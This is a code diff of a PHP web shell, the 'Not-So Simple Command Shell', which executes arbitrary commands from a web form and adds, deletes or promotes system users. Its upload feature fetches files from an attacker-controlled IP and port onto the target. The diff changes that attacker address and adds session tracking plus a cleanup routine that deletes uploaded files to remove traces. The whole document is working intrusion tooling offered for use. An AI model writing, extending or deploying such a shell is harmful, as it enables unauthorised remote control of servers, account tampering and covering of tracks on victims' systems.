@@ -1,3 +1,14 @@
+<?php
+session_start();
+//session_destroy();
+function is_post_request() {
+    return $_SERVER['REQUEST_METHOD'] == 'POST';
+}
+
+function is_get_request() {
+    return $_SERVER['REQUEST_METHOD'] == 'GET';
+}
+?>
 <!doctype html>
 <html lang="en">
     <head>
@@ -24,13 +35,14 @@
                 echo '<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:50%;"><h4>Error!</h4><p>resource not found. make sure specified file exists on the target box</p></div>';
             }
         }
-        $attackip = "10.0.2.6";
+        $attackip = "192.168.0.18";
         $attackport = "8000";
         echo '
         <div style="border:1px solid #333;width:50%;padding:0px 30px;border-radius:10px;margin:10px 40px;">
         <p style=""><small>The Not-So Simple Command Shell - Courtesy of KaotickJ</small></p>
-        <form action="" method="get">Command? <input type="text" name="cmd" autofocus/>
-        <button type="submit">Execute</button>&nbsp;&nbsp;&nbsp;&nbsp;<a href="?links=1">QuickLinks</a></form><br>
+        <div style="display:inline;margin:10px;"><form style="float:left" action="" method="get">Command? <input type="text" name="cmd" autofocus/>
+        <button type="submit">Execute</button>&nbsp;&nbsp;&nbsp;&nbsp;<a href="?links=1">QuickLinks</a></form><form style="float:right" action="nsscmdshell.php" method="GET"><button name="clean" id="action-button" title="deletes all files uploaded using nsscmdshell.  please note that you must manually remove nsscmdshell."> Cleanup Files </button>&nbsp;&nbsp;<button name="check" id="action-button" title="show $_SESSION[\'actions\']"> Show $_SESSION </button></form></div>
+<p>&nbsp;</p>
         File Options<br>
         <form action="" method="get">
         <select name="upload">
@@ -62,8 +74,9 @@
         <input type="text" name="user" placeholder="user to alter" />&nbsp;&nbsp;<input type="text" name="pass" placeholder="password if adding user" />
         <br><br>
         <button type="submit" name="addUser" title="adds the secified user to the system with the password provided.">Add User</button>&nbsp;<button type="submit" name="userAdmin" title="sets the specified user as adminstrator. only works with sufficient permissions on the current user.">Set Admin</button>&nbsp;<button type="submit" name="userStandard" title="sets the specified user as a standard user. only works with sufficient permissions on the current user.">Set Standard User</button>&nbsp;<button type="submit" name="delUser" title="deletes the specified user from the system. only works with sufficient permissions on the current user.">DelUser</button>&nbsp;&nbsp;&nbsp;&nbsp;<button onClick="window.location.reload();">Clear Console</button>
-        </form><br>
-<a href="?update=true"><small><small><small>Update</small></small></small></a><br><br>
+        </form><br>';
+
+        echo '<a href="?update=true"><small><small><small>Update</small></small></small></a><br><br>
         </div>';
 
         if (isset($_GET['addUser'])){
@@ -98,8 +111,17 @@
         if (isset($_GET['upload'])) {
             if($_GET['upload'] == "") die('<div style="background:red;color:#fff;margin:10px 40px;padding:30px;width:50%;"><h4>Error!</h4><p>you must choose a file to upload first.</p></div>');
             if($_GET['upload'] == "Choose") die('<div style="background:red;color:#fff;margin:10px 40px;padding:30px;width:50%;"><h4>Error!</h4><p>you must choose a file to upload first.</p></div>');
+            $action = $_GET['upload'];
+                if(!in_array($action, $_SESSION['actions'])) {
+                $_SESSION['actions'][] = $action;
+//				var_dump($_SESSION['actions']);
+                }
             file_put_contents($_GET['upload'], file_get_contents("http://".$attackip.":".$attackport."/" .$_GET['upload']));
-        }
+/*            echo '<pre>';
+            var_dump($_SESSION['actions']);
+            echo '</pre>';*/
+            }
+
 
         if (isset($_GET['cmd'])) {
             if($_GET['cmd'] == "") die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:50%;"><h4>Error!</h4><p>no command specified. you must enter a command to be executed</p></div>');
@@ -121,7 +143,36 @@
             <a href="https://int0x33.medium.com/day-76-use-nishang-empire-and-other-ps1-scripts-manually-332b4604e2a7" target="_blank">Nishang Usage</a><br>
             <a href="https://int0x33.medium.com/day-26-the-complete-list-of-windows-post-exploitation-commands-no-powershell-999b5433b61e" target="_blank">Windows Post-Exploitation Commands</a>';
             }
-//FUNCTIONS
+
+if (is_get_request()){
+    if (isset($_GET['clean'])) {
+        $cleans = $_SESSION['actions'];
+        foreach($cleans as $clean) {
+            if (!unlink ($clean)){
+                die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:50%;"><h4>Error!</h4><p>$clean can\'t be deleted.</p>');
+            }
+            else {
+                echo '<div style="width:50%;margin:20px 40px;padding:20px 30px;color:#fff;background-color:green;font-size:1.2em;">Deleted: '. $clean .'<br>';
+            }
+        }
+            if ($_SESSION){
+                unset($_SESSION['actions']);
+                session_destroy();
+                ob_start();
+                ob_clean();
+                sleep(1);
+                if ($_SESSION['actions'] == NULL) echo '<p>Cleanup completed successfully.</p></div>';
+            } else {
+                die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:50%;"><h4>Error!</h4><p>Nothing to do!</p></div>');
+            }
+    }
+    if (isset($_GET['check'])) {
+        echo '<pre style="margin:20px 40px;padding:20px 30px;color:#fff;background-color:#000;font-size:1.2em;">';
+        var_dump($_SESSION['actions']);
+        echo '</pre>';
+    }
+
+}
 
 ?>
     </body>
